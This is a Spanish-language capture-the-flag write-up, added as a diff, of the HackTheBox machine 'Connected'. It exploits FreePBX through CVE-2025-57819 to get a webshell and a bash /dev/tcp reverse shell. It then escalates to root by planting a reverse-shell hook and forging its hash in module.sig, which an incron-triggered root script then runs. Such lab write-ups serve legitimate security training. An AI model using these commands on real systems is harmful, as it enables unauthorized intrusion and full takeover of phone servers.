@@ -1,0 +1,453 @@
+---
+title: Connected
+featured: true
+lang: es
+image: ../../../../../images/writeups/hackthebox/connected/connected.png
+platform: htb
+difficulty: easy
+os: linux
+hints: [CVE-2025-57819, Incrond monitoring, Signature tampering]
+tags:
+  [
+    hackthebox,
+    linux,
+    apache,
+    cve-2025-57819,
+    authentication-bypass,
+    sqli,
+    rce,
+    incrond,
+    php,
+    signature-bypass,
+  ]
+parent: writeups/hackthebox/machines
+draft: true
+---
+
+<div style="display: flex; justify-content: center;">
+
+![Cap](@images/writeups/hackthebox/connected/connected.png)
+
+</div>
+
+<div style="text-align: center;">
+
+[https://app.hackthebox.com/machines/Connected](https://app.hackthebox.com/machines/Connected)
+
+</div>
+
+## Enumeration
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/Connected 10.129.8.139
+```
+
+```plaintext
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack ttl 63
+80/tcp  open  http    syn-ack ttl 63
+443/tcp open  https   syn-ack ttl 63
+```
+
+```bash
+nmap -p 22,80,443 -sCV -oA nmap/openPorts 10.129.8.139
+```
+
+```plaintext
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
+|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
+|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
+|_http-title: Did not follow redirect to http://connected.htb/
+443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
+| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2025-11-30T14:07:27
+|_Not valid after:  2026-11-30T14:07:27
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
+|_ssl-date: TLS randomness does not represent time
+```
+
+Agregar `connected.htb` al archivo `/etc/hosts`
+
+## Exploitation
+
+Google `FreePBX 16.0.40.7`
+
+[CVE-2025-57819 FreePBX Pre-Auth RCE](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819)
+
+```bash
+python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://connected.htb
+```
+
+```plaintext
+			__         ___  ___________
+	__  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
+	\ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
+	 \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
+	  \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
+				 \/          \/     \/
+
+        watchTowr-vs-FreePBX-CVE-2025-57819.py
+        (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE
+
+          - Piotr and Sonny of watchTowr
+
+[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
+[+] Sending exploit request
+[+] Waiting 2 minutes for DAG script to be created
+[+] VULNERABLE - webshell found: http://connected.htb/this-is-an-ioc-not-actually-watchTowr-42rvxyxr8g.php?cmd=hostname
+[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table
+```
+
+```bash
+nc -lnvp 1111
+```
+
+[http://connected.htb/this-is-an-ioc-not-actually-watchTowr-42rvxyxr8g.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.59/1111+0>%261"](http://connected.htb/this-is-an-ioc-not-actually-watchTowr-42rvxyxr8g.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.59/1111+0>%261")
+
+```bash
+ls -R /home/
+```
+
+```plaintext
+/home/:
+asterisk
+
+/home/asterisk:
+user.txt
+```
+
+### User flag
+
+```bash
+cat /home/asterisk/user.txt
+```
+
+<Callout type="success" title="User flag">
+  1ce**************************59d
+</Callout>
+
+## Privilege Escalation
+
+```bash
+ps aux
+```
+
+```plaintext
+<SNIP>
+root        757  0.0  0.0  15044  2924 ?        Ss   15:49   0:00 /usr/sbin/incrond
+<SNIP>
+```
+
+> incrond (the inotify cron daemon) is a Linux background service that monitors file system events (such as creating, modifying, or deleting files) and automatically executes specified commands or scripts when those events occur.  
+> [https://linux.die.net/man/8/incrond](https://linux.die.net/man/8/incrond)
+
+```bash
+cat /etc/incron.d/*
+```
+
+```plaintext
+/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
+/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
+/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
+/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
+/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
+/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
+/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
+/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
+
+/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
+```
+
+```bash
+ls -l /usr/bin/sysadmin_manager
+```
+
+```bash
+cat /usr/bin/sysadmin_manager
+```
+
+```php
+#!/usr/bin/php
+<?php
+namespace Sysadmin;
+
+//
+// Secure Sysadmin Hook Service
+// Copyright 2018 Sangoma Technologies
+//
+
+//////////////////////////////////////////////////////////////////
+// This file is DELIBERATELY left un-encoded to assist security //
+// researchers, and to allow people to add their own keys if    //
+// required. If you have questions or comments, please email    //
+// them to security@freepbx.org or on #freepbx on Freenode.     //
+//////////////////////////////////////////////////////////////////
+
+//
+// This is NOT FREE SOFTWARE. You are NOT PERMITTED to modify
+// or redistribute this code. All rights are reserved.
+//
+
+openlog("sysadmin-hook", LOG_PID | LOG_PERROR, LOG_CRON);
+
+// Verify that our 'includes' file is correct
+if (!file_exists("/usr/lib/sysadmin/includes.php")) {
+	$err = "Unable to open /usr/lib/sysadmin/includes.php";
+	syslog(LOG_ERR, $err);
+	print "$err\n";
+	exit;
+}
+
+// This hash is automatically updated when the RPM is built. If
+// this is not matching, reinstall the RPM.
+$includeshash = "4b04888e0c323dacc57836beb1d5e1890a00eafd431b3288519fb8644aedd358";
+
+$hashalgo = "sha256";
+
+if (hash_file($hashalgo, "/usr/lib/sysadmin/includes.php") !== $includeshash) {
+	$err = "File /usr/lib/sysadmin/includes.php has been tampered. Reinstall sysadmin RPM.";
+	syslog(LOG_ERR, $err);
+	print "$err\n";
+	exit;
+}
+
+require '/usr/lib/sysadmin/includes.php';
+
+// These are the keys that are allowed to run root hooks.
+$whitelist = array(
+	"9F9169F4B33B4659" => "FreePBX Master Key",
+	"86CE877469D2EAD9" => "Signing Server 1 (2014-2020)",
+	"3DDB2122FE6D84F7" => "Signing Server Backup (2014-2020)",
+	"1588A7366BD35B34" => "FreePBX Master Key v2",
+	"B53D215A755231A3" => "Mirror Server",
+	"E5413049B80EA480" => "Jason Parker <jparker@sangoma.com> (Developer, Sangoma)",
+	"5803D408E0FB9844" => "Matt Brooks <mbrooks@digium.com> (Developer, Sangoma)",
+	"8ED515BA06CD38AD" => "FreePBX QA Module Signing <qa@sangoma.net>",
+);
+
+if (!isset($argv[1])) {
+	syslog(LOG_ERR, "Need a hook param, not supplied.");
+	exit;
+}
+
+if ($argv[1] == "--local") {
+	$request = $argv[2];
+	$filename = "/usr/local/asterisk/incron/$request";
+} else {
+	$request = $argv[1];
+	$filename = "/var/spool/asterisk/incron/$request";
+}
+
+syslog(LOG_DEBUG, "sysadmin hook started - ".json_encode($argv));
+
+// Delete the file.
+if (!file_exists($filename)) {
+	syslog(LOG_WARNING, "File '$filename' didn't exist. That's unpossible (Are you running incron commands manually?)");
+	$fh = fopen("/dev/null", "r");
+} else {
+	// Open a file handle against this file before deleting it, in case we need
+	// the contents later.
+	$fh = fopen($filename, "r");
+	unlink($filename);
+}
+
+// Validate it matches the format of modulename_hookname, or modulename.hookname.params
+if (!preg_match('/^(\w+)_([\w-]+)$/', $request, $parts)) {
+        // No?  How about modulename.hookname.params?
+        if (!preg_match('/^([\w_]+)\.([\w-]+)(?:\.(.+))?$/', $request, $parts)) {
+		syslog(LOG_ERR, "Invalid hook format");
+		exit;
+        }
+}
+
+$module = $parts[1];
+$hook = $parts[2];
+// Were there params?
+if (isset($parts[3])) {
+	// Is this the magic string 'CONTENTS'? If so, load the contents
+	// from our file handle (up to 4k)
+	if ($parts[3] === "CONTENTS") {
+		$params = fread($fh, 4096);
+	} else {
+		$params = $parts[3];
+	}
+} else {
+	$params = "";
+}
+fclose($fh);
+
+// Is this a core system hook? These aren't stored with modules,
+// and are used in things like HA, for emergency repairs.
+// These are triggered as SYSTEM.hookname. Must be caps.
+if ($module == "SYSTEM") {
+	$sigfile = "/usr/local/asterisk/$hook.sig";
+	$hookfile = "/usr/local/asterisk/$hook";
+} else {
+	// We have to work under the assumption that MODDIR is
+	// /var/www/html/admin/modules/ - we can't ask FreePBX,
+	// as it may be compromised.
+	$sigfile = "/var/www/html/admin/modules/$module/module.sig";
+	$hookfile = "/var/www/html/admin/modules/$module/hooks/$hook";
+}
+
+if (!file_exists($sigfile)) {
+	syslog(LOG_ERR, "Can't find signature file '$sigfile'");
+	exit;
+}
+
+if (!file_exists($hookfile)) {
+	syslog(LOG_ERR, "Invalid hook when looking for '$hookfile'");
+	exit;
+}
+
+// Included in /usr/lib/sysadmin/includes.php
+$g = new \Sysadmin\GPG();
+
+$verify = $g->checkSig($sigfile);
+if (!isset($verify['hashes'])) {
+	syslog(LOG_ERR, "Module tampered. No hashes from $module/module.sig. Can't proceed");
+	exit;
+}
+
+// Is our module signed by one of the whitelisted keys?
+if (!isset($verify['config']['signedwith'])) {
+	syslog(LOG_ERR, "Strange result from GPG checkSig");
+	exit;
+}
+
+$signedwith = $verify['config']['signedwith'];
+if (!isset($whitelist[$signedwith])) {
+	syslog(LOG_ERR, "Module signed by key not in whitelist.");
+	exit;
+}
+
+// Awesome. We now have a valid module. Let's make sure that the file we're
+// being asked to run is actually IN the module.sig file. If it's a SYSTEM
+// file, it will have the complete path in the file. If it's a non-system
+// file, it will have a relative path.
+if ($module == "SYSTEM") {
+	$signame = $hookfile;
+} else {
+	$signame = "hooks/$hook";
+}
+
+// Does it exist?
+if (!isset($verify['hashes'][$signame])) {
+	syslog(LOG_ERR, "Hook $signame not in signature file $sigfile");
+	exit;
+}
+
+// Finally, has that file been tampered?
+if (hash_file('sha256', $hookfile) !== $verify['hashes'][$signame]) {
+	syslog(LOG_ERR, "Hash mismatch of $hookfile. Can't run");
+	exit;
+}
+
+// Lucky last. Did someone derp, and release a broken module that
+// haxx0rz are using? Let's make sure that they can't recycle that
+// signature file as a system one.
+if ($module == "SYSTEM") {
+	if ($verify['config']['type'] != "system") {
+		syslog(LOG_ERR, "Tried to load a system hook, but signature isn't a system signature?");
+		exit;
+	}
+}
+
+// WOOT! Before we actually do anything, ensure there's nothing nasty on the params.
+
+// Warning: This explicitly breaks utf8. If you need unicode, base64 it.
+if (preg_match('/[^\x20-\x7e]/', $params, $out)) {
+	syslog(LOG_ERR, "Out of spec char in params $params, ".json_encode($out));
+        exit;
+}
+
+// Extra double sanity check.
+if (preg_match('/[`\'"$><&;]/', $params)) {
+	syslog(LOG_ERR, "Detected invalid char in params. You must use base64 to pass unusual chars to a hook.");
+        exit;
+}
+
+if (!is_executable($hookfile)) {
+	syslog(LOG_ERR, "'$hookfile' is not executable. Can not run.");
+	exit;
+}
+
+syslog(LOG_DEBUG, "Security check passed. Running '$hookfile $params'");
+system("$hookfile $params");
+```
+
+```bash
+cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.59/2222 0>&1
+EOF
+```
+
+```bash
+sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}'
+```
+
+```plaintext
+e67d7942027d4230698b3db7d4b3aa725fc64b1589548b70b92d88f8c7133e61
+```
+
+```bash
+nano /var/www/html/admin/modules/ucp/module.sig
+```
+
+```plaintext
+<SNIP>
+/hooks/logrotate = e67d7942027d4230698b3db7d4b3aa725fc64b1589548b70b92d88f8c7133e61
+<SNIP>
+```
+
+```bash
+nc -lnvp 2222
+```
+
+```bash
+touch /var/spool/asterisk/incron/ucp.logrotate
+```
+
+```bash
+id
+```
+
+```plaintext
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+```bash
+ls
+```
+
+```plaintext
+bin  boot  dev	etc  home  lib	lib64  media  mnt  opt	proc  root  run  sbin  srv  sys  tftpboot  tmp	usr  var
+```
+
+```bash
+cd /root
+```
+
+```bash
+ls
+```
+
+```plaintext
+root.txt
+```
+
+```bash
+cat root.txt
+```
+
+### Root flag
+
+<Callout type="success" title="Root flag">
+  28a**************************d45
+</Callout>
